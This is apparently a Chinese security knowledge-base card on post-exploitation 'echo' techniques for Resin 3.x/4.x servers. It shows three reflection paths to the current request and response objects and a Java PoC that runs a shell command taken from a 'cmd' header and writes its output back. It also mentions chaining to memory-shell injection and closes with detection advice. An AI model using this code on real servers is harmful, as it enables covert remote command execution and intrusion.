---
id: web-java-component-resin-request-response-echo-threadlocals-servletinvocation-tcpsocketlink
title: Resin 3.x/4.x 无回显利用的三种取 request/response 路径：ThreadLocals 扫描、ServletInvocation.getContextRequest 与 TcpSocketLink.getCurrentRequest
type: scenario
domain: web
path: web/java/component
technique: resin-echo-threadlocals-servletinvocation-tcpsocketlink
tags:
- java
- resin
- caucho
- echo
- threadlocals
- servletinvocation
- tcpsocketlink
- deserialization
- memshell
cve: []
severity: medium
confidence: high
status: verified
affected_versions: Resin 4.x（原文环境 4.0.66；ServletInvocation 路径兼容 Resin 3.x）
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V566
  verified_at: '2026-11-12T09:19:04+08:00'
  notes: '已对照原文 24 张图核对：图15 Resin 4.0.66 调试显示 threadLocals→table→value=HttpRequest 与 _response，图16 AbstractHttpRequest.getResponseFacade 返回 _responseFacade，图18-19 ServletInvocation.getContextRequest 返回 HttpServletRequestImpl 且含 _response，图20-21 TcpSocketLink.getCurrentRequest 返回 HttpRequest，图17 Postman POST /resin_1.jsp 带 cmd: whoami 回显 laptop-cvfi6reo\bmth；三种取 request/response 路径、3.x 从父类取 _response 的差异与 PoC 均与原文一致。affected_versions 为原文环境 Resin 4.0.66，原文代码含 Resin 3.0 分支。dedup top 为 Spring WebFlux/Netty、Undertow、Spring RequestContextHolder、Jetty 回显卡，容器与反射目标不同，非同链；dup-scan 无涉及 pair。未验证点：未复现。'
url: /docs/web/java/component/web-java-component-resin-request-response-echo-threadlocals-servletinvocation-tcpsocketlink/
draft: false
kb_aliases:
- Resin 回显
- Resin 内存马回显
- com.caucho.server.dispatch.ServletInvocation
- TcpSocketLink.getCurrentRequest
- com.caucho.server.http.HttpRequest
- AbstractHttpRequest.getResponseFacade
---

## 一句话结论

在 Resin 3.x/4.x 上拿到代码执行（反序列化、BeanShell、表达式注入等）但命令无回显时，可以从三个位置反射取到当前请求与响应对象：扫描当前线程 `threadLocals` 中 `com.caucho.server.http.HttpRequest`、调用 `ServletInvocation.getContextRequest()` 返回的 `HttpServletRequestImpl` 的 `_response` 字段、或 `TcpSocketLink.getCurrentRequest()` 返回的 `HttpRequest` 父类 `_responseFacade`；拿到 response 后 `getWriter()` 即可把命令输出写回当前 HTTP 响应。

## 原理

- **请求对象在场**：Resin 处理请求的调用链为 `TcpSocketLink.handleRequest → HttpRequest.handleRequest → ServletInvocation.service → FilterChain/Servlet`，当前请求对象被存放在线程上下文。原文用动态调试确认 `Thread.currentThread()` 的 `threadLocals`（`ThreadLocalMap.table`）中存在 value 为 `HttpRequest` 的条目，且其中 `_response` 字段即当前响应。
- **路径一：ThreadLocals 扫描**：无侵入地遍历 `Thread.currentThread().getClass().getSuperclass().getDeclaredField("threadLocals")` → `table` → 每个 `Entry.value`，匹配类名 `com.caucho.server.http.HttpRequest`；再调用 `getResponseFacade()`（`AbstractHttpRequest` 的方法）取得响应，反射 `getWriter()` 写回显。
- **路径二：ServletInvocation.getContextRequest()**：`com.caucho.server.dispatch.ServletInvocation.getContextRequest()` 内部调用 `TcpSocketLink.getCurrentRequest()`，若返回 `AbstractHttpRequest` 则 `getRequestFacade()` 转为 `HttpServletRequestImpl`；该对象有 `_response`（`HttpServletResponseImpl`）字段。反射取 `_response` → `getWriter()` 即可。Resin 3.0 的 `HttpRequest` 需要从父类取 `_response`，4.x 可直接取。
- **路径三：TcpSocketLink.getCurrentRequest()**：`com.caucho.network.listen.TcpSocketLink.getCurrentRequest()` 直接返回 `(ProtocolConnection)_currentRequest.get()`，实际类型为 `com.caucho.server.http.HttpRequest`；其父类 `AbstractHttpRequest` 持有 `_responseFacade`，通过 `getResponseFacade()` 或反射该字段取得响应。
- **为什么能回显**：response 对象与本次请求绑定，`getWriter()` 返回的 `PrintWriter` 写入的字节会随本次 HTTP 响应返回给攻击者，因此可以在一次反序列化/脚本执行请求内直接读取 `cmd` 请求头并输出命令结果，无需 OOB 通道。
- **适用性**：三种方式都在应用 JVM 内反射调用，不依赖特定漏洞入口；Resin 版本差异主要体现在字段位于当前类还是父类、以及 `HttpRequest` 与 `HttpServletRequestImpl` 的类型差异。

## 触发条件

- 目标使用 Resin 3.x/4.x（原文环境 Resin 4.0.66）。
- 攻击者已获得一次 JVM 内代码执行能力（反序列化、BeanShell、表达式注入、JSP 写入等），且在同一请求线程内执行。
- 安全策略未禁止反射访问 `com.caucho.*` 类与 `ThreadLocalMap`（JDK 8 环境通常可用）。

## 利用步骤

1. 准备回显卡：优先用 `ServletInvocation.getContextRequest()`（代码最短），失败再试 `TcpSocketLink.getCurrentRequest()` 或 ThreadLocals 扫描。
2. 反射取 request：`Class.forName("com.caucho.server.dispatch.ServletInvocation").getMethod("getContextRequest").invoke(null)`。
3. 取 response：4.x 直接取 `_response` 字段；3.x 从父类 `_response` 取；或对 `HttpRequest` 调用 `getResponseFacade()`。
4. 写回显：反射 `getWriter()` 得到 `PrintWriter`，读取 `cmd` 请求头，`Runtime.exec` 后把输出 `write` 回去。
5. 验证：请求中带 `cmd: whoami`，响应体出现命令结果。

## PoC

最短路径（ServletInvocation，JSP/脚本片段）：

```java
Object req = Thread.currentThread().getContextClassLoader()
        .loadClass("com.caucho.server.dispatch.ServletInvocation")
        .getMethod("getContextRequest").invoke(null);
java.lang.reflect.Field f = req.getClass().getName().contains("com.caucho.server.http.HttpRequest")
        ? req.getClass().getSuperclass().getDeclaredField("_response")
        : req.getClass().getDeclaredField("_response");
f.setAccessible(true);
Object resp = f.get(req);
java.io.PrintWriter out = (java.io.PrintWriter) resp.getClass().getMethod("getWriter").invoke(resp);
String cmd = (String) req.getClass().getMethod("getHeader", String.class).invoke(req, "cmd");
java.util.Scanner sc = new java.util.Scanner(
        Runtime.getRuntime().exec(new String[]{"sh","-c",cmd}).getInputStream()).useDelimiter("\\A");
out.write(sc.hasNext() ? sc.next() : "");
```

ThreadLocals 扫描与 `TcpSocketLink.getCurrentRequest()` 版本见原文；核心差异只是对象来源，最后都落到 `getWriter()` 写回。原文实测 Postman `POST /resin_1.jsp` 带 `cmd: whoami` 返回 `laptop-cvfi6reo\bmth`。

## 变体与关联

- ThreadLocals 扫描：适合不确定 Resin 具体版本、或 `ServletInvocation` 被裁剪时；遍历 `ThreadLocalMap.table` 匹配 `HttpRequest`。
- `TcpSocketLink.getCurrentRequest()`：返回 `ProtocolConnection`（实际 `HttpRequest`），通过父类 `_responseFacade` 或 `getResponseFacade()` 取响应。
- 静态变量/单例回显：某些中间件把 request 存在静态字段或特定类中，可顺藤摸瓜反射获取（通用思路）。
- 与内存马衔接：拿到 `HttpServletRequestImpl` 后进一步 `getWebApp()` 可注入 Filter 内存马（见 Resin Filter 内存马卡）。
- 与反序列化衔接：把回显逻辑放进 `AbstractTranslet` 静态块，配合 XStream/原生反序列化在请求线程内执行。

## 检测与防御

- 升级 Resin 到修复版本；对 `com.caucho.*` 敏感反射调用（`getContextRequest`、`getCurrentRequest`、`threadLocals`）做 RASP 检测。
- 禁止/限制应用内任意代码执行入口（反序列化白名单、BeanShell 移除、表达式沙箱），从源头消除回显前提。
- 日志与流量侧：同一请求内响应体出现命令输出、请求头 `cmd`/`whoami` 等特征；结合 WAF 拦截异常 `cmd` 头。
- 运行时排查：JVM attach 检查线程 `threadLocals` 引用、`WebApp` 过滤器列表异常新增（配合内存马检测）。
